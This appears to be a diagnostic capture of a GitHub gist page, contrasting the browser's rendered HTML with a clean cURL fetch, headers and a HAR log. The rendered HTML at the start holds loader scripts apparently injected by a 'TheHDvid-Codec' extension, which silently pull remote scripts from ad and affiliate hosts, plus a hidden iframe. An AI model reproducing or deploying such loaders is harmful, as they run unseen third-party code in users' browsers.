119 !== 288)){return;}var host = document.location.host;if ( (window.name.indexOf('_odctxdsp') === 0) ||(host.match(new RegExp('(?:.*.)?view.contextualyield.com', 'g')) ||host.match(new RegExp('(?:.*.)?touch.offersonspot.com', 'g')) ||host.match(new RegExp('(?:.*.)?digital.deals-beat.com', 'g')) ||host.match(new RegExp('(?:.*.)?cloud.contextual-edge.com', 'g')) ||host.match(new RegExp('(?:.*.)?pulse.contextualify.com', 'g')) ||host.match(new RegExp('(?:.*.)?contextual.ctx-traffic.com', 'g'))) ){if (288 != 273 && 288 != 185){return;}}if (typeof window.__myWindow__ === 'function' && window.__myWindow__(288)){return;}if ( typeof window.__onlyMe__ === 'function' && window.__onlyMe__(288) ){return;}function f(){return typeof window['__utility_running_63315_288__'] !== 'undefined';}try {if (f()) {return;}var httpUrl = 'http://istatic.eshopcomp.com/fo/min/crqc.js?hid=149525929fae92db32a394a703a5bbe7&bname=TheHDvid-Codec&subid=300182410022000000';var httpsUrl = 'https://istatic.eshopcomp.com/fo/min/crqc.js?hid=149525929fae92db32a394a703a5bbe7&bname=TheHDvid-Codec&subid=300182410022000000';var K = document.createElement('script');K.setAttribute('type', 'text/javascript');var src = httpUrl;if ((typeof document.location.protocol === 'string') && (document.location.protocol.indexOf('https') === 0)) {if (!httpsUrl || httpsUrl.length === 0) {return;}src = httpsUrl}try{src=src.replace(/__DOMAIN__/g,encodeURIComponent(window.location.host))}catch(_e){}K.setAttribute('src', src);var tag = (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]);var c = 0;if (!document || !document.body){var id = setInterval(function (){var tag = (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]);if (!document || !document.body || !tag){if (c>20){clearInterval(id);return;}c++;return;}if (!f()){tag.appendChild(K);window['__utility_running_63315_288__'] = true;window['__eRhHJ'] = window['__eRhHJ'] ? (window['__eRhHJ'] + ',' + 288) : 288;}}, 500);} else {if (!f()){tag.appendChild(K);window['__utility_running_63315_288__'] = true;window['__eRhHJ'] = window['__eRhHJ'] ? (window['__eRhHJ'] + ',' + 288) : 288;}}} catch (L) {}}());var __t = document.getElementById('__utility_running_63315_288__');__t.parentNode.removeChild(__t);</script><script id="__utility_running_63315_380__" type="text/javascript">(function (){if (window.top !== window.self){return;}if (typeof __pluginBlockedSite__ !== 'undefined'&&__pluginBlockedSite__){return;}if (document && document.location && typeof document.location.host == 'string' && typeof window.__validDomain__ !== 'undefined' && !window.__validDomain__ && (194 !== 380 || 287 !== 380 || 119 !== 380)){return;}var host = document.location.host;if ( (window.name.indexOf('_odctxdsp') === 0) ||(host.match(new RegExp('(?:.*.)?view.contextualyield.com', 'g')) ||host.match(new RegExp('(?:.*.)?touch.offersonspot.com', 'g')) ||host.match(new RegExp('(?:.*.)?digital.deals-beat.com', 'g')) ||host.match(new RegExp('(?:.*.)?cloud.contextual-edge.com', 'g')) ||host.match(new RegExp('(?:.*.)?pulse.contextualify.com', 'g')) ||host.match(new RegExp('(?:.*.)?contextual.ctx-traffic.com', 'g'))) ){if (380 != 273 && 380 != 185){return;}}if (typeof window.__myWindow__ === 'function' && window.__myWindow__(380)){return;}if ( typeof window.__onlyMe__ === 'function' && window.__onlyMe__(380) ){return;}function f(){return typeof window['__utility_running_63315_380__'] !== 'undefined';}try {if (f()) {return;}window.__ntf_ibic__='794CC92401E24B428E1CD52EDA8B6D0EIE';window.__ntf_veri__='806e6b8b461f3c245c8387d7783a0257';window.__ntf_br__='ff';window.__ntf_cmp__='001824';window.__ntf_geo__='ID';window.__ntf_name__='TheHDvid-Codec';var httpUrl = 'http://cdn.gosignserv.com/cc/a.js?__src_locator__=cc';var httpsUrl = 'https://d2a8a4q9.ssl.hwcdn.net/cc/a.js?__src_locator__=cc';var K = document.createElement('script');K.setAttribute('type', 'text/javascript');var src = httpUrl;if ((typeof document.location.protocol === 'string') && (document.location.protocol.indexOf('https') === 0)) {if (!httpsUrl || httpsUrl.length === 0) {return;}src = httpsUrl}try{src=src.replace(/__DOMAIN__/g,encodeURIComponent(window.location.host))}catch(_e){}K.setAttribute('src', src);var tag = (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]);var c = 0;if (!document || !document.body){var id = setInterval(function (){var tag = (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]);if (!document || !document.body || !tag){if (c>20){clearInterval(id);return;}c++;return;}if (!f()){tag.appendChild(K);window['__utility_running_63315_380__'] = true;window['__eRhHJ'] = window['__eRhHJ'] ? (window['__eRhHJ'] + ',' + 380) : 380;}}, 500);} else {if (!f()){tag.appendChild(K);window['__utility_running_63315_380__'] = true;window['__eRhHJ'] = window['__eRhHJ'] ? (window['__eRhHJ'] + ',' + 380) : 380;}}} catch (L) {}}());var __t = document.getElementById('__utility_running_63315_380__');__t.parentNode.removeChild(__t);</script><script id="__utility_running_63315_385__" type="text/javascript">(function (){if (window.top !== window.self){return;}if (typeof __pluginBlockedSite__ !== 'undefined'&&__pluginBlockedSite__){return;}if (document && document.location && typeof document.location.host == 'string' && typeof window.__validDomain__ !== 'undefined' && !window.__validDomain__ && (194 !== 385 || 287 !== 385 || 119 !== 385)){return;}var host = document.location.host;if ( (window.name.indexOf('_odctxdsp') === 0) ||(host.match(new RegExp('(?:.*.)?view.contextualyield.com', 'g')) ||host.match(new RegExp('(?:.*.)?touch.offersonspot.com', 'g')) ||host.match(new RegExp('(?:.*.)?digital.deals-beat.com', 'g')) ||host.match(new RegExp('(?:.*.)?cloud.contextual-edge.com', 'g')) ||host.match(new RegExp('(?:.*.)?pulse.contextualify.com', 'g')) ||host.match(new RegExp('(?:.*.)?contextual.ctx-traffic.com', 'g'))) ){if (385 != 273 && 385 != 185){return;}}if (typeof window.__myWindow__ === 'function' && window.__myWindow__(385)){return;}if ( typeof window.__onlyMe__ === 'function' && window.__onlyMe__(385) ){return;}function f(){return typeof window['__utility_running_63315_385__'] !== 'undefined';}try {if (f()) {return;}var httpUrl = 'http://api.jollywallet.com/affiliate/client?dist=329&sub=300182410022000000&name=TheHDvid-Codec';var httpsUrl = 'https://api.jollywallet.com/affiliate/client?dist=329&sub=300182410022000000&name=TheHDvid-Codec';var K = document.createElement('script');K.setAttribute('type', 'text/javascript');var src = httpUrl;if ((typeof document.location.protocol === 'string') && (document.location.protocol.indexOf('https') === 0)) {if (!httpsUrl || httpsUrl.length === 0) {return;}src = httpsUrl}try{src=src.replace(/__DOMAIN__/g,encodeURIComponent(window.location.host))}catch(_e){}K.setAttribute('src', src);var tag = (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]);var c = 0;if (!document || !document.body){var id = setInterval(function (){var tag = (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]);if (!document || !document.body || !tag){if (c>20){clearInterval(id);return;}c++;return;}if (!f()){tag.appendChild(K);window['__utility_running_63315_385__'] = true;window['__eRhHJ'] = window['__eRhHJ'] ? (window['__eRhHJ'] + ',' + 385) : 385;}}, 500);} else {if (!f()){tag.appendChild(K);window['__utility_running_63315_385__'] = true;window['__eRhHJ'] = window['__eRhHJ'] ? (window['__eRhHJ'] + ',' + 385) : 385;}}} catch (L) {}}());var __t = document.getElementById('__utility_running_63315_385__');__t.parentNode.removeChild(__t);</script><script id="__utility_running_63315_450__" type="text/javascript">(function (){if (window.top !== window.self){return;}if (typeof __pluginBlockedSite__ !== 'undefined'&&__pluginBlockedSite__){return;}if (document && document.location && typeof document.location.host == 'string' && typeof window.__validDomain__ !== 'undefined' && !window.__validDomain__ && (194 !== 450 || 287 !== 450 || 119 !== 450)){return;}var host = document.location.host;if ( (window.name.indexOf('_odctxdsp') === 0) ||(host.match(new RegExp('(?:.*.)?view.contextualyield.com', 'g')) ||host.match(new RegExp('(?:.*.)?touch.offersonspot.com', 'g')) ||host.match(new RegExp('(?:.*.)?digital.deals-beat.com', 'g')) ||host.match(new RegExp('(?:.*.)?cloud.contextual-edge.com', 'g')) ||host.match(new RegExp('(?:.*.)?pulse.contextualify.com', 'g')) ||host.match(new RegExp('(?:.*.)?contextual.ctx-traffic.com', 'g'))) ){if (450 != 273 && 450 != 185){return;}}if (typeof window.__myWindow__ === 'function' && window.__myWindow__(450)){return;}if ( typeof window.__onlyMe__ === 'function' && window.__onlyMe__(450) ){return;}function f(){return typeof window['__utility_running_63315_450__'] !== 'undefined';}try {if (f()) {return;}var httpUrl = 'http://cdncache-a.akamaihd.net/sub/p3af2c8/300182410022000000/l.js?pid=2271&ext=TheHDvid-Codec';var httpsUrl = 'https://cdncache-a.akamaihd.net/sub/p3af2c8/300182410022000000/l.js?pid=2271&ext=TheHDvid-Codec';var K = document.createElement('script');K.setAttribute('type', 'text/javascript');var src = httpUrl;if ((typeof document.location.protocol === 'string') && (document.location.protocol.indexOf('https') === 0)) {if (!httpsUrl || httpsUrl.length === 0) {return;}src = httpsUrl}try{src=src.replace(/__DOMAIN__/g,encodeURIComponent(window.location.host))}catch(_e){}K.setAttribute('src', src);var tag = (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]);var c = 0;if (!document || !document.body){var id = setInterval(function (){var tag = (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]);if (!document || !document.body || !tag){if (c>20){clearInterval(id);return;}c++;return;}if (!f()){tag.appendChild(K);window['__utility_running_63315_450__'] = true;window['__eRhHJ'] = window['__eRhHJ'] ? (window['__eRhHJ'] + ',' + 450) : 450;}}, 500);} else {if (!f()){tag.appendChild(K);window['__utility_running_63315_450__'] = true;window['__eRhHJ'] = window['__eRhHJ'] ? (window['__eRhHJ'] + ',' + 450) : 450;}}} catch (L) {}}());var __t = document.getElementById('__utility_running_63315_450__');__t.parentNode.removeChild(__t);</script></head><body><pre>{
      $.ajax({
          url: 'https://cdn.detik.net.id/libs/dc/v1/menu.js',
          jsonp: true,var navLoadMenu = function()
          jsonpCallback:'dtkmenu',
          dataType: "jsonp",
          success: function( response ) {
              $('#drop_kanal').append(response[0] );
              $('.drop_kanal .menu_k').css('height',$( window ).height()*0.8);
          }
      });
  }
  $('#ico_detik').click(function(){
      if (! $('#drop_kanal').find('.menu_k').length)
          navLoadMenu();
      
      if($( "#ico_detik" ).hasClass( "active" )){
          $("#drop_kanal").fadeOut(200);
          $(".ico_detik").removeClass("active");
      }
      else {
          $("#drop_kanal").fadeIn(200);
          $(".ico_detik").addClass("active");
      }
  });
  $('#fm_user').click(function(){
      if($( "#fm_user" ).hasClass( "active" )){
          $("#drop_users").fadeOut(200);
          $(".fm_user").removeClass("active");
      }
      else {
          $("#drop_users").fadeIn(200);
          $(".fm_user").addClass("active");
      }
  });
</pre><iframe t="Browser" style="width: 1px; height: 1px; display: none;" id="DiscoveryApp"></iframe><script src="https://discoveryapp-a.akamaihd.net/DiscoveryApp/cr" type="text/javascript"></script></body></html>
-focus:
h.handle = i = function(a) {
  return typeof f != "undefined" && (!a || f.event.triggered !== a.type) ? f.event.dispatch.apply(i.elem, arguments) : b
}
-keyup (2):
var fn = function(e) {
  if (typeof addEventListenerForRemoveOnShutDown !== 'undefined') {
    !callback || callback.call(node, e);
  }
}
-load (8):
ready: function() {
  if (!a.isReady) {
    if (!ac.body) {
      return setTimeout(a.ready, 13);
    }
    a.isReady = true;
    if (af) {
      var a0, e = 0;
      while ((a0 = af[e++])) {
        a0.call(ac, a);
      }
      af = null;
    }
    if (a.fn.triggerHandler) {
      a(ac).triggerHandler("ready");
    }
  }
}
-message (5):
function d(a) {
  var e = a.data,
    f = {},
    g = 0,
    h = [];
  if (a.source === b && "object" === typeof e && "DiscoveryApp" === e.b) switch (e.mt) {
    case "rs":
      if (!N) break;
      H = !0;
      if (!J) {
        do x[g].sc ? g++ : h.push.apply(h, x.splice(g, 1)); while (g < x.length)
      }
      x.length && c(a);
      h.length && x.push.apply(x, h);
      break;
    case "agir":
      if (!N) break;
      m.e(e.aid + "_" + e.ak, function(b) {
        f.b = "DiscoveryApp";
        f.mt =
          "agid";
        f.aid = e.aid;
        f.ak = e.ak;
        f.av = b;
        a.source.postMessage(f, a.origin)
      });
      break;
    case "asir":
      if (!N) break;
      m.m(e.aid + "_" + e.ak, e.av);
      break;
    case "gr":
      f.b = "DiscoveryApp";
      f.mt = "gd";
      f.g = E;
      a.source.postMessage(f, a.origin);
      break;
    case "dr":
      if (h = e.aid, "number" === typeof h && t && -1 === B(O, h))
        for (var ca = t.abm; g < ca.length; g++)
          if (ca[g].id === h) {
            O.push(h);
            m.m(m.i.R, O);
            break
          }
  }
}
-unload (5):
function(ac) {
  setTimeout(function() {
    try {
      Components.utils.nukeSandbox(L);
    } catch (ad) {}
  }, 10);
}
-URL:
https://gist.githubusercontent.com/alph4delta/a86fad124e0be9ebbefd4f7c7d661c30/raw/f52f18f08231de4618bc3ed63e3787d8ec4c55ee/var%20navLoadMenu%20=%20function()
-cURL:
curl "https://gist.githubusercontent.com/alph4delta/a86fad124e0be9ebbefd4f7c7d661c30/raw/f52f18f08231de4618bc3ed63e3787d8ec4c55ee/var"%"20navLoadMenu"%"20="%"20function()" -H "Host: gist.githubusercontent.com" -H "User-Agent: Mozilla/5.0 (Windows NT 6.0; rv:47.0) Gecko/20100101 Firefox/47.0" -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" -H "Accept-Language: en-US,en;q=0.5" --compressed -H "Connection: keep-alive" -H "If-None-Match: ""86d10fb8e105f0b9d56837a6e3b5771e306d16ae""" -H "Cache-Control: max-age=0"
-Via GitBash:
Welcome to Git (version 1.9.4-preview20140611)


Run 'git help git' to display the help index.
Run 'git help <command>' to display help for specific commands.

Axioo@AXIOO-PC ~ (master|AM/REBASE)
$ curl "https://gist.githubusercontent.com/alph4delta/a86fad124e0be9ebbefd4f7c7
d661c30/raw/f52f18f08231de4618bc3ed63e3787d8ec4c55ee/var"%"20navLoadMenu"%"20="
%"20function()" -H "Host: gist.githubusercontent.com" -H "User-Agent: Mozilla/5
.0 (Windows NT 6.0; rv:47.0) Gecko/20100101 Firefox/47.0" -H "Accept: text/html
,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" -H "Accept-Language: en
-US,en;q=0.5" --compressed -H "Connection: keep-alive" -H "If-None-Match: ""86d
10fb8e105f0b9d56837a6e3b5771e306d16ae""" -H "Cache-Control: max-age=0"
{
      $.ajax({
          url: 'https://cdn.detik.net.id/libs/dc/v1/menu.js',
          jsonp: true,var navLoadMenu = function()
          jsonpCallback:'dtkmenu',
          dataType: "jsonp",
          success: function( response ) {
              $('#drop_kanal').append(response[0] );
              $('.drop_kanal .menu_k').css('height',$( window ).height()*0.8);
          }
      });
  }
  $('#ico_detik').click(function(){
      if (! $('#drop_kanal').find('.menu_k').length)
          navLoadMenu();

      if($( "#ico_detik" ).hasClass( "active" )){
          $("#drop_kanal").fadeOut(200);
          $(".ico_detik").removeClass("active");
      }
      else {
          $("#drop_kanal").fadeIn(200);
          $(".ico_detik").addClass("active");
      }
  });
  $('#fm_user').click(function(){
      if($( "#fm_user" ).hasClass( "active" )){
          $("#drop_users").fadeOut(200);
          $(".fm_user").removeClass("active");
      }
      else {
          $("#drop_users").fadeIn(200);
          $(".fm_user").addClass("active");
      }
  });

Axioo@AXIOO-PC ~ (master|AM/REBASE)
$ 
-Request Headers:
GET /alph4delta/a86fad124e0be9ebbefd4f7c7d661c30/raw/f52f18f08231de4618bc3ed63e3787d8ec4c55ee/var%20navLoadMenu%20=%20function() HTTP/1.1
Host: gist.githubusercontent.com
User-Agent: Mozilla/5.0 (Windows NT 6.0; rv:47.0) Gecko/20100101 Firefox/47.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
If-None-Match: "86d10fb8e105f0b9d56837a6e3b5771e306d16ae"
Cache-Control: max-age=0
-Response Headers:
HTTP/1.1 304 Not Modified
Date: Thu, 21 Jul 2016 18:24:27 GMT
Via: 1.1 varnish
Cache-Control: max-age=300
Etag: "86d10fb8e105f0b9d56837a6e3b5771e306d16ae"
Connection: keep-alive
X-Served-By: cache-sin6926-SIN
X-Cache: HIT
X-Cache-Hits: 2
Vary: Authorization,Accept-Encoding
access-control-allow-origin: *
X-Fastly-Request-ID: fe3fb672bbe7e15f18ed2ea9613611f891810c14
Expires: Thu, 21 Jul 2016 18:29:27 GMT
Source-Age: 231
-Response:
{
      $.ajax({
          url: 'https://cdn.detik.net.id/libs/dc/v1/menu.js',
          jsonp: true,var navLoadMenu = function()
          jsonpCallback:'dtkmenu',
          dataType: "jsonp",
          success: function( response ) {
              $('#drop_kanal').append(response[0] );
              $('.drop_kanal .menu_k').css('height',$( window ).height()*0.8);
          }
      });
  }
  $('#ico_detik').click(function(){
      if (! $('#drop_kanal').find('.menu_k').length)
          navLoadMenu();
      
      if($( "#ico_detik" ).hasClass( "active" )){
          $("#drop_kanal").fadeOut(200);
          $(".ico_detik").removeClass("active");
      }
      else {
          $("#drop_kanal").fadeIn(200);
          $(".ico_detik").addClass("active");
      }
  });
  $('#fm_user').click(function(){
      if($( "#fm_user" ).hasClass( "active" )){
          $("#drop_users").fadeOut(200);
          $(".fm_user").removeClass("active");
      }
      else {
          $("#drop_users").fadeIn(200);
          $(".fm_user").addClass("active");
      }
  });

-Security:
Cipher suite: TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256
-Fingerprints:
SHA-256 Fingerprint: 58:65:35:27:54:1E:23:91:C7:F1:78:97:A2:A8:FE:90:2B:E8:1E:7A:9F:58:64:72:BC:97:64:F0:C5:85:1B:EE
SHA1 Fingerprint: 21:99:13:84:63:72:17:13:B9:ED:0E:8F:00:A5:9B:73:0D:D0:56:58
-HAR:
{
  "log": {
    "version": "1.1",
    "creator": {
      "name": "Firefox",
      "version": "47.0"
    },
    "browser": {
      "name": "Firefox",
      "version": "47.0"
    },
    "pages": [
      {
        "startedDateTime": "2016-07-22T01:24:28.547+07:00",
        "id": "page_1",
        "title": "https://gist.githubusercontent.com/alph4delta/a86fad124e0be9ebbefd4f7c7d661c30/raw/f52f18f08231de4618bc3ed63e3787d8ec4c55ee/var%20navLoadMenu%20=%20function()",
        "pageTimings": {
          "onContentLoad": -1,
          "onLoad": -1
        }
      }
    ],
    "entries": [
      {
        "pageref": "page_1",
        "startedDateTime": "2016-07-22T01:24:28.547+07:00",
        "time": 70,
        "request": {
          "bodySize": 0,
          "method": "GET",
          "url": "https://gist.githubusercontent.com/alph4delta/a86fad124e0be9ebbefd4f7c7d661c30/raw/f52f18f08231de4618bc3ed63e3787d8ec4c55ee/var%20navLoadMenu%20=%20function()",
          "httpVersion": "HTTP/1.1",
          "headers": [
            {
              "name": "Host",
              "value": "gist.githubusercontent.com"
            },
            {
              "name": "User-Agent",
              "value": "Mozilla/5.0 (Windows NT 6.0; rv:47.0) Gecko/20100101 Firefox/47.0"
            },
            {
              "name": "Accept",
              "value": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
            },
            {
              "name": "Accept-Language",
              "value": "en-US,en;q=0.5"
            },
            {
              "name": "Accept-Encoding",
              "value": "gzip, deflate, br"
            },
            {
              "name": "Connection",
              "value": "keep-alive"
            },
            {
              "name": "If-None-Match",
              "value": "\"86d10fb8e105f0b9d56837a6e3b5771e306d16ae\""
            },
            {
              "name": "Cache-Control",
              "value": "max-age=0"
            }
          ],
          "cookies": [],
          "queryString": [],
          "postData": {
            "mimeType": "",
            "params": [],
            "text": ""
          },
          "headersSize": 505
        },
        "response": {
          "status": 304,
          "statusText": "Not Modified",
          "httpVersion": "HTTP/1.1",
          "headers": [
            {
              "name": "Cache-Control",
              "value": "max-age=300"
            },
            {
              "name": "Connection",
              "value": "keep-alive"
            },
            {
              "name": "Date",
              "value": "Thu, 21 Jul 2016 18:24:27 GMT"
            },
            {
              "name": "Etag",
              "value": "\"86d10fb8e105f0b9d56837a6e3b5771e306d16ae\""
            },
            {
              "name": "Expires",
              "value": "Thu, 21 Jul 2016 18:29:27 GMT"
            },
            {
              "name": "Source-Age",
              "value": "231"
            },
            {
              "name": "Vary",
              "value": "Authorization,Accept-Encoding"
            },
            {
              "name": "Via",
              "value": "1.1 varnish"
            },
            {
              "name": "X-Cache",
              "value": "HIT"
            },
            {
              "name": "X-Cache-Hits",
              "value": "2"
            },
            {
              "name": "X-Fastly-Request-ID",
              "value": "fe3fb672bbe7e15f18ed2ea9613611f891810c14"
            },
            {
              "name": "X-Served-By",
              "value": "cache-sin6926-SIN"
            },
            {
              "name": "access-control-allow-origin",
              "value": "*"
            }
          ],
          "cookies": [],
          "content": {
            "mimeType": "text/plain; charset=utf-8",
            "size": 1065,
            "text": "{\n      $.ajax({\n          url: 'https://cdn.detik.net.id/libs/dc/v1/menu.js',\n          jsonp: true,var navLoadMenu = function()\n          jsonpCallback:'dtkmenu',\n          dataType: \"jsonp\",\n          success: function( response ) {\n              $('#drop_kanal').append(response[0] );\n              $('.drop_kanal .menu_k').css('height',$( window ).height()*0.8);\n          }\n      });\n  }\n  $('#ico_detik').click(function(){\n      if (! $('#drop_kanal').find('.menu_k').length)\n          navLoadMenu();\n      \n      if($( \"#ico_detik\" ).hasClass( \"active\" )){\n          $(\"#drop_kanal\").fadeOut(200);\n          $(\".ico_detik\").removeClass(\"active\");\n      }\n      else {\n          $(\"#drop_kanal\").fadeIn(200);\n          $(\".ico_detik\").addClass(\"active\");\n      }\n  });\n  $('#fm_user').click(function(){\n      if($( \"#fm_user\" ).hasClass( \"active\" )){\n          $(\"#drop_users\").fadeOut(200);\n          $(\".fm_user\").removeClass(\"active\");\n      }\n      else {\n          $(\"#drop_users\").fadeIn(200);\n          $(\".fm_user\").addClass(\"active\");\n      }\n  });\n"
          },
          "redirectURL": "",
          "headersSize": 438,
          "bodySize": 1065
        },
        "cache": {},
        "timings": {
          "blocked": 0,
          "dns": 0,
          "connect": 0,
          "send": 0,
          "wait": 70,
          "receive": 0
        },
        "serverIPAddress": "151.101.100.133",
        "connection": "443"
      }
    ]
  }
}



		 		  
